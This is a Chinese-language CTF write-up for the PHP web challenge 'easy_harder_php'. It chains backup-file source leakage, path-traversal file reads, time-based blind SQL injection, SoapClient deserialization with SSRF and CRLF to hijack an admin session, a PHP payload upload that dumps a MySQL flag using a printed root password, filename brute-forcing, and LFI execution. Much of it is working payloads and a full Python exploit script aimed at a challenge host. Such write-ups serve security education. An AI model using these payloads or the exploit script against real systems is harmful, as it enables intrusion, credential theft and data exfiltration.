# easy_harder_php writeup

## 题目信息
- 题目：`easy_harder_php`
- 方向：Web
- 考点：SQL 注入、反序列化、SSRF、CRLF、文件上传、LFI
- 最终 flag：`flag{15c294ce-500c-44bc-95f0-72c94a08c9dc}`

---

## 一句话利用链

```text
备份源码泄露 -> signature SQLi -> 盲注确认 admin 密码 nu1ladmin
-> showmess() 反序列化 -> 用 PHP 5.5 + soap 生成兼容 SoapClient 对象
-> SSRF/CRLF 本地登录 admin -> admin 上传 -shell.php
-> 利用 rm *.jpg 通配符参数问题绕过清理
-> 爆破真实文件名 -> LFI 包含执行 -> 读 flag
```

---

## 1. 源码泄露与入口

可直接访问：
- `index.php~`
- `config.php~`
- `user.php~`
- `/views/`

`index.php~`：

```php
<?php
require_once 'user.php';
$C = new Customer();
if(isset($_GET['action']))
    require_once 'views/'.$_GET['action'];
else
    header('Location: index.php?action=login');
```

这里说明 `action` 存在目录穿越包含能力，可以直接读任意文件，例如：

```text
/index.php?action=../../../../etc/passwd
/index.php?action=../../../../run.sh
/index.php?action=../../../../proc/self/maps
```

---

## 2. 关键源码点

### 2.1 SQL 注入点：publish.signature

`user.php~` 中：

```php
function publish()
{
    if(!$this->check_login()) return false;
    if($this->is_admin == 0)
    {
        if(isset($_POST['signature']) && isset($_POST['mood'])) {

            $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));
            $db = new Db();
            @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
            if($ret)
                return true;
            else
                return false;
        }
    }
    ...
}
```

`config.php~` 中：

```php
public function insert($columns,$table,$values){
    $column = $this->get_column($columns);
    $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
    $sql = 'insert into '.$table.'('.$column.') values '.$value;
    $result = $this->conn->query($sql);
    return $result;
}
```

这里 `signature` 可控，且 values 是通过反引号拼出来再替换为单引号，所以可以利用反引号闭合做注入。

### 2.2 反序列化点：showmess()

```php
function showmess()
{
    ...
    @$ret = $db->select(array('username','signature','mood','id'),'ctf_user_signature',"userid = $this->userid order by id desc");
    if($ret) {
        $data = array();
        while ($row = $ret->fetch_row()) {
            $sig = $row[1];
            $mood = unserialize($row[2]);
            $country = $mood->getcountry();
            $ip = $mood->ip;
            $subtime = $mood->getsubtime();
            ...
        }
    }
}
```

这里会：
1. `unserialize($row[2])`
2. 立刻调用 `$mood->getcountry()`

所以只要能通过 SQLi 把恶意对象写到 `mood` 字段，访问 `index` 页就会触发。

### 2.3 管理员上传点

普通用户 `publish` 是发签名；管理员 `publish` 变成上传：

```php
if($this->is_admin == 0) {
    ...
} else {
    if(isset($_FILES['pic'])) {
        if (upload($_FILES['pic'])) {
            echo 'upload ok!';
            return true;
        }
    }
}
```

`config.php~` 中 `upload()`：

```php
function upload($file){
    $file_size  = $file['size'];
    if($file_size>2*1024*1024) {
        echo "pic is too big!";
        return false;
    }
    $file_type = $file['type'];
    if($file_type!="image/jpeg" && $file_type!='image/pjpeg') {
        echo "file type invalid";
        return false;
    }
    if(is_uploaded_file($file['tmp_name'])) {
        $uploaded_file = $file['tmp_name'];
        $user_path =  "/app/adminpic";
        if (!file_exists($user_path)) {
            mkdir($user_path);
        }
        $file_true_name = str_replace('.','',pathinfo($file['name'])['filename']);
        $file_true_name = str_replace('/','',$file_true_name);
        $file_true_name = str_replace('\\','',$file_true_name);
        $file_true_name = $file_true_name.time().rand(1,100).'.jpg';
        $move_to_file = $user_path."/".$file_true_name;
        if(move_uploaded_file($uploaded_file,$move_to_file)) {
            if(stripos(file_get_contents($move_to_file),'<?php')>=0)
                system('sh /home/nu1lctf/clean_danger.sh');
            return $file_true_name;
        }
        else
            return false;
    }
    else
        return false;
}
```

### 2.4 清理脚本

LFI 读 `/home/nu1lctf/clean_danger.sh` 得到：

```bash
#!/bin/bash
cd /app/adminpic/
rm *.jpg
```

这里可以通过上传 `-shell.php` 这种以 `-` 开头的文件名触发通配符展开参数问题，导致清理脚本不能正常删除目标文件。

---

## 3. 环境差异

读取 `/run.sh` 得到：

```bash
mysql -e "USE flag;INSERT INTO flag (flag) VALUES('$FLAG');" -uroot -pNu1Lctf\%\#\~\:p
export FLAG=not_flag
FLAG=not_flag
sed -i "s/;session.upload_progress.enabled = On/session.upload_progress.enabled = Off/g"
```

说明：
- flag 在 MySQL `flag.flag` 表中
- `session.upload_progress.enabled = Off`

再读 `/proc/self/maps`：
- 找到 `mysqli.so`、`curl.so`、`json.so`
- **没找到 `soap.so`**

这说明当前实例和公开 WP 的环境有差异：
- 直接用本机 PHP 8 生成的 `SoapClient` payload 不兼容
- 需要使用 **PHP 5.5 + soap** 环境生成兼容对象

---

## 4. SQLi 拿 admin 密码

### 4.1 时间盲注验证

先确认 `signature` 的盲注成立：

真条件：

```text
1`,if((ascii(substr((select password from ctf_users where is_admin=1),1,1))=50),sleep(3),1))#
```

假条件：

```text
1`,if((ascii(substr((select password from ctf_users where is_admin=1),1,1))=51),sleep(3),1))#
```

结果：
- 真条件约 3.2s
- 假条件约 0.2s

### 4.2 管理员密码

最终确认 admin 密码哈希：

```text
2533f492a796a3227b0c6f91d102cc36
```

对应明文：

```text
nu1ladmin
```

---

## 5. 反序列化链打 admin

### 5.1 先确认对象注入链能通

先不要急着打 `SoapClient`，先把一个正常 `Mood` 对象写进 `mood` 字段，验证：
- SQLi 写对象成功
- `index` 页访问时 `unserialize()` 能正常跑

例如：

```php
O:4:"Mood":3:{
  s:4:"mood";i:2;
  s:2:"ip";s:9:"127.0.0.1";
  s:4:"date";i:1773903331;
}
```

注入后首页能正常显示，说明：

```text
SQLi -> 写对象 -> unserialize()
```

这条链是通的。

### 5.2 生成 PHP 5.5 兼容的 SoapClient 对象

宿主机安装了 Docker，并构建了本地镜像：

```text
php55soap:local
```

用于生成 **PHP 5.5 + soap** 兼容的序列化对象。

生成 admin 登录 payload 的核心 PHP：

```php
<?php
$target = 'http://127.0.0.1/index.php?action=login';
$post = 'username=admin&password=nu1ladmin&code=' . $argv[2];
$headers = array('Cookie: PHPSESSID=' . $argv[1]);

$b = new SoapClient(null,array(
  'location'   => $target,
  'user_agent' => 'wupco^^Content-Type: application/x-www-form-urlencoded^^'
                  .join('^^',$headers)
                  .'^^Content-Length: '.(string)strlen($post)
                  .'^^^^'.$post,
  'uri'        => 'aaab'
));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
echo $aaa;
?>
```

### 5.3 注入到 `mood`

使用 SQLi：

```text
a`,0x<序列化对象hex>);#
```

然后访问：

```text
index.php?action=index
```

触发 `unserialize()`，让固定 `PHPSESSID` 对应会话在本地完成 admin 登录。

登录成功的判据是：
- 访问该 session 的 `publish` 页会出现管理员上传表单
- 首页会变成显示 `/adminpic/` 下文件列表

---

## 6. 管理员上传并执行 PHP

### 6.1 上传内容

上传表单字段名：

```text
pic
```

上传内容：

```php
<?php
$m=new mysqli("localhost","root","Nu1Lctf%#~:p","flag");
$r=$m->query("select flag from flag");
$row=$r->fetch_row();
echo $row[0];
?>
```

原始文件名使用：

```text
-shell.php
```

MIME：

```text
image/jpeg
```

### 6.2 最终文件名规则

源码决定最终文件名：

```php
$file_true_name = $file_true_name.time().rand(1,100).'.jpg';
```

由于原始名字是 `-shell.php`，去掉点后会变成：

```text
-shell<TIMESTAMP><1..100>.jpg
```

### 6.3 爆破真实文件名

围绕上传时间戳爆：

```text
-shell<start-5 到 start+5><1..100>.jpg
```

最终命中：

```text
-shell177390725830.jpg
```

---

## 7. LFI 包含执行

最后直接访问：

```text
/index.php?action=../../../../app/adminpic/-shell177390725830.jpg
```

回显：

```text
flag{15c294ce-500c-44bc-95f0-72c94a08c9dc}
```

---

## 8. 最终 flag

```text
flag{15c294ce-500c-44bc-95f0-72c94a08c9dc}
```

---

## 9. 完整 exp

> 说明：下面给的是**可复现的完整利用思路版 exp**。其中为了生成和目标 PHP 5.5 更兼容的 `SoapClient` 对象，我当时用的是本地 Docker 里的 `php55soap:local` 镜像。若你本机没有该镜像，需要先按下面的 Docker 步骤临时准备一个 PHP 5.5 + soap 环境。

### 9.1 生成 PHP 5.5 + soap 环境（可选）

如果你本机直接有 PHP 5.5 并加载了 `soap` 扩展，这一步可以跳过。

当时我本地临时做法核心思路是：

1. 安装 Docker
2. 拉 `php:5.5-cli`
3. 在容器内补 `soap` 扩展
4. 固化成 `php55soap:local`

示意命令（可按自己环境调整）：

```bash
docker pull php:5.5-cli

# 需要有 libxml2 头文件和 xml2-config，可按环境自行处理
# 最终目标：得到一个能执行 `php -m | grep soap` 的 php55 镜像
```

---

### 9.2 完整 Python exp

```python
#!/usr/bin/env python3
import re
import os
import time
import binascii
import hashlib
import tempfile
import subprocess
import requests

BASE = 'http://59495085-3204-4da3-a090-f3b167d37a0d.node.pediy.com:81/'


def solve(prefix, limit=9000000):
    for i in range(limit):
        s = str(i)
        if hashlib.md5(s.encode()).hexdigest()[:5] == prefix:
            return s
    raise RuntimeError('no solve for prefix: %s' % prefix)


def get_code_prefix(html):
    m = re.search(r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)', html)
    if not m:
        raise RuntimeError('code prefix not found')
    return m.group(1)


def register_and_login_normal_user():
    s = requests.Session()

    r = s.get(BASE + 'index.php?action=register', timeout=15)
    reg_prefix = get_code_prefix(r.text)
    reg_code = solve(reg_prefix)
    username = 'wc' + reg_code
    password = 'wcpass123'

    s.post(BASE + 'index.php?action=register', data={
        'username': username,
        'password': password,
        'code': reg_code,
    }, timeout=15)

    r = s.get(BASE + 'index.php?action=login', timeout=15)
    login_prefix = get_code_prefix(r.text)
    login_code = solve(login_prefix)

    s.post(BASE + 'index.php?action=login', data={
        'username': username,
        'password': password,
        'code': login_code,
    }, timeout=15)

    return s, username, password


def time_blind(s, cond, rounds=2):
    payload = f"1`,if(({cond}),sleep(3),1))#"
    times = []
    for _ in range(rounds):
        t0 = time.time()
        s.post(BASE + 'index.php?action=publish', data={
            'signature': payload,
            'mood': '1',
        }, timeout=10)
        times.append(time.time() - t0)
    return times


def confirm_admin_password_hash():
    s, _, _ = register_and_login_normal_user()
    true_cond = ' and '.join([
        f"ascii(substr((select password from ctf_users where is_admin=1),{i+1},1))={ord(ch)}"
        for i, ch in enumerate('2533f492a796a3227b0c6f91d102cc36')
    ])
    false_cond = ' and '.join([
        f"ascii(substr((select password from ctf_users where is_admin=1),{i+1},1))={ord(ch)}"
        for i, ch in enumerate('2533f492a796a3227b0c6f91d102cc30')
    ])

    t_true = time_blind(s, true_cond, rounds=2)
    t_false = time_blind(s, false_cond, rounds=2)

    print('[+] true hash timing :', t_true)
    print('[+] false hash timing:', t_false)
    print('[+] admin password = nu1ladmin')


def gen_php55_user_agent_payload(sessid, code):
    php = r'''<?php
$target = 'http://127.0.0.1/index.php?action=login';
$post = 'username=admin&password=nu1ladmin&code=' . $argv[2];
$headers = array('Cookie: PHPSESSID=' . $argv[1]);
$b = new SoapClient(null,array(
  'location'   => $target,
  'user_agent' => 'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post).'^^^^'.$post,
  'uri'        => 'aaab'
));
$aaa = serialize($b);
$aaa = str_replace('^^', "\r\n", $aaa);
echo $aaa;
?>'''

    with tempfile.NamedTemporaryFile('w', delete=False, suffix='.php') as f:
        f.write(php)
        path = f.name

    try:
        out = subprocess.check_output([
            'docker', 'run', '--rm',
            '-v', f'{path}:/tmp/gen.php:ro',
            'php55soap:local',
            'php', '/tmp/gen.php', sessid, code
        ], text=False)
    finally:
        os.unlink(path)

    return out.decode('latin1')


def get_admin_session_via_unserialize():
    src, _, _ = register_and_login_normal_user()

    admin_sess = 'admfinal999'
    probe = requests.Session()
    probe.cookies.set('PHPSESSID', admin_sess)

    r = probe.get(BASE + 'index.php?action=login', timeout=15)
    prefix = get_code_prefix(r.text)
    admin_code = solve(prefix)

    obj = gen_php55_user_agent_payload(admin_sess, admin_code)
    hexobj = binascii.hexlify(obj.encode('latin1')).decode()
    sig = f"a`,0x{hexobj});#"

    src.post(BASE + 'index.php?action=publish', data={
        'signature': sig,
        'mood': '1',
    }, timeout=20)

    # 触发 showmess()->unserialize()
    for _ in range(2):
        src.get(BASE + 'index.php?action=index', timeout=20, allow_redirects=False)
        time.sleep(1)

    admin = requests.Session()
    admin.cookies.set('PHPSESSID', admin_sess)
    pub = admin.get(BASE + 'index.php?action=publish', timeout=20)
    if 'Hi admin' not in pub.text:
        raise RuntimeError('admin login failed')

    print('[+] admin session ready:', admin_sess)
    return admin


def upload_shell(admin):
    payload = b'''<?php
$m = new mysqli("localhost","root","Nu1Lctf%#~:p","flag");
$r = $m->query("select flag from flag");
$row = $r->fetch_row();
echo $row[0];
?>'''

    start = int(time.time())
    r = admin.post(
        BASE + 'index.php?action=publish',
        files={'pic': ('-shell.php', payload, 'image/jpeg')},
        timeout=20,
    )
    print('[+] upload response:', r.text[:120])
    return start


def brute_filename_and_lfi(admin, start_ts):
    for ts in range(start_ts - 5, start_ts + 6):
        for rnd in range(1, 101):
            name = f'-shell{ts}{rnd}.jpg'
            r = admin.get(BASE + 'index.php', params={
                'action': '../../../../app/adminpic/' + name
            }, timeout=15, allow_redirects=False)

            if 'flag{' in r.text.lower():
                print('[+] hit file:', name)
                print('[+] flag:', r.text.strip())
                return name, r.text.strip()

    raise RuntimeError('filename brute failed')


def main():
    confirm_admin_password_hash()
    admin = get_admin_session_via_unserialize()
    start = upload_shell(admin)
    name, flag = brute_filename_and_lfi(admin, start)
    print('[+] final shell file:', name)
    print('[+] final flag:', flag)


if __name__ == '__main__':
    main()
```

---

### 9.3 关键 payload 摘录

#### SQLi 时间盲注（确认 admin 密码首字符）

```text
1`,if((ascii(substr((select password from ctf_users where is_admin=1),1,1))=50),sleep(3),1))#
```

#### SQLi 注入序列化对象到 `mood`

```text
a`,0x<serialized_object_hex>);#
```

#### 最终 LFI 执行上传文件

```text
/index.php?action=../../../../app/adminpic/-shell177390725830.jpg
```

---

### 9.4 注意事项

1. `code` 必须在**同一个 session** 下实时计算。
2. 这题当前实例里 Web 侧未加载 `soap.so`，所以不能直接用本机 PHP 8 的 `SoapClient` 序列化对象。
3. `session.upload_progress` 在当前实例里是 **Off**，不要再走那条链。
4. 管理员上传后，首页不一定直接显示真实文件名，最稳的是按：

```text
-shell<timestamp><1..100>.jpg
```

去爆破。
